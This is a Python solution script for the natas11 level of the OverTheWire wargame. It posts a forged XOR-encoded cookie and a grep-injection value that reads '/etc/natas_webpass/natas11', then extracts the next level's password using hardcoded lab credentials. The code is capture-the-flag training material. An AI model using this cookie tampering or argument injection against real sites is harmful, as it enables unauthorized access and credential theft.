import requests
import re

username = 'natas11'
password = '1KFqoJXi6hRaPluAmk8ESDW4fSysRoIg'

url = f"http://{username}.natas.labs.overthewire.org/"

cookie = {'data': 'MGw7JCQ5OC04PT8jOSpqdmk3LT9pYmouLC0nICQ8anZpbS4qe354fGkz'}

response = requests.post(url, cookies=cookie, data = {"submit": "submit", "needle": ". /etc/natas_webpass/natas11 #"}, auth = (username, password) )

#print(response.text)

print(re.findall('password for natas12 is (.*)<br>', response.text)[0])

# MGw7JCQ5OC04PT8jOSpqdmk3LT9pYmouLC0nICQ8anZpbS4qe354fGkz